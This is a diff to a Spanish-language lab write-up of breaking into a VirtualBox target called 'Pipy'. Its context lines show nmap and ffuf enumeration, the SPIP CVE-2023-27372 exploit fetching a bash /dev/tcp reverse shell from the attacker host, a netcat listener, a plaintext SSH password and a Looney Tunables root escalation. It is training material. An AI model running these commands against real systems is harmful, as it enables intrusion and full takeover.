@@ -32,7 +32,7 @@
 
 El laboratorio se ha montado en **VirtualBox** con la siguiente topología:
 
-```
+```bash
 Red NAT: 192.168.100.0/24 (con DHCP)
 ├── Kali Linux (atacante) → IP estática: 192.168.100.250/24
 └── Pipy (objetivo)       → IP dinámica: 192.168.100.6/24
@@ -52,7 +52,7 @@ sudo nmap -n -sn 192.168.100.0/24
 
 **Salida relevante:**
 
-```
+```bash
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-09 06:20 +0200
 Nmap scan report for 192.168.100.1
 Host is up (0.00036s latency).
@@ -93,7 +93,7 @@ sudo nmap -n -Pn -sS -p- 192.168.100.6
 
 **Salida:**
 
-```
+```bash
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-09 07:18 +0200
 Nmap scan report for 192.168.100.6
 Host is up (0.00046s latency).
@@ -127,7 +127,7 @@ sudo nmap -n -Pn -sV -sC -O -p 22,80 192.168.100.6
 
 **Salida:**
 
-```
+```bash
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-09 07:36 +0200
 Nmap scan report for 192.168.100.6
 Host is up (0.00071s latency).
@@ -179,7 +179,7 @@ curl -I http://192.168.100.6
 
 **Salida:**
 
-```
+```bash
 HTTP/1.1 200 OK
 Date: Thu, 09 Apr 2026 06:49:08 GMT
 Server: Apache/2.4.52 (Ubuntu)
@@ -199,7 +199,7 @@ whatweb -v 192.168.100.6
 
 **Salida:**
 
-```
+```bash
 WhatWeb report for http://192.168.100.6
 Status    : 200 OK
 Title     : Mi sitio SPIP
@@ -249,7 +249,7 @@ ffuf -u http://192.168.100.6/FUZZ -w /tmp/DirBuster-2007_directory-list-2.3-medi
 
 **Resultados destacados (882.184 peticiones):**
 
-```
+```bash
 .php                [Status: 403, Size: 278]
 .html               [Status: 403, Size: 278]
 index.php           [Status: 200, Size: 7519]
@@ -279,7 +279,7 @@ searchsploit SPIP
 
 **Salida:**
 
-```
+```bash
 SPIP v4.2.0 - Remote Code Execution (Unauthenticated)  | php/webapps/51536.py
 ```
 
@@ -311,7 +311,7 @@ echo 'bash -c "/bin/bash -i >& /dev/tcp/192.168.100.250/1331 0>&1"' > reverse_pi
 python3 -m http.server 8000
 ```
 
-```
+```bash
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
@@ -323,7 +323,7 @@ En una **nueva terminal**:
 nc -lvnp 1331
 ```
 
-```
+```bash
 listening on [any] 1331 ...
 ```
 
@@ -336,7 +336,7 @@ python3 CVE-2023-27372.py -u http://192.168.100.6 -c 'curl http://192.168.100.25
 
 **Salida del exploit:**
 
-```
+```bash
 [+] Anti-CSRF token found : iYe2q77AjJpzr7DiCN466DffCNPeUp0xMFqKM8HZ2jA5IWNjp6Vhzoioj1CV4d/wM8wzPYKIJAYCiLEY+fBNfgPHcNshG3+b
 ```
 
@@ -344,7 +344,7 @@ python3 CVE-2023-27372.py -u http://192.168.100.6 -c 'curl http://192.168.100.25
 
 En la terminal con netcat recibimos la conexión de la máquina Pipy:
 
-```
+```bash
 connect to [192.168.100.250] from (UNKNOWN) [192.168.100.6] 34418
 bash: cannot set terminal process group (840): Inappropriate ioctl for device
 bash: no job control in this shell
@@ -456,6 +456,8 @@ MariaDB [spip]> select nom,pass from spip_auteurs;
 ```bash
 ssh angela@192.168.100.6
 # Password: 4ng3l4
+angela@pipy:~$ cat user.txt
+...
 ```
 
 ---
@@ -515,6 +517,11 @@ try 200
 uid=0(root) gid=0(root) groups=0(root),1000(angela)
 # whoami
 root
+# cd /root
+# ls
+root.txt  snap
+# cat root.txt
+...
 ```
 
 > **¡Escalada completada!** Somos `root`.
@@ -525,9 +532,9 @@ root
 
 | # | Vulnerabilidad | CVE | Criticidad | Impacto |
 |---|---------------|-----|------------|---------|
-| 1 | SPIP RCE no autenticado | CVE-2023-27372 | 🔴 Crítica (CVSS 9.8) | Ejecución de código remoto como `www-data` |
-| 2 | Credenciales en texto plano | — | 🟠 Alta | Acceso a base de datos y contraseña de usuario del sistema |
-| 3 | Looney Tunables (glibc) | CVE-2023-4911 | 🔴 Alta (CVSS 7.8) | Escalada de privilegios a `root` |
+| 1 | SPIP RCE no autenticado | CVE-2023-27372 | Crítica (CVSS 9.8) | Ejecución de código remoto como `www-data` |
+| 2 | Credenciales en texto plano | — | Alta | Acceso a base de datos y contraseña de usuario del sistema |
+| 3 | Looney Tunables (glibc) | CVE-2023-4911 | Alta (CVSS 7.8) | Escalada de privilegios a `root` |
 
 ---
 
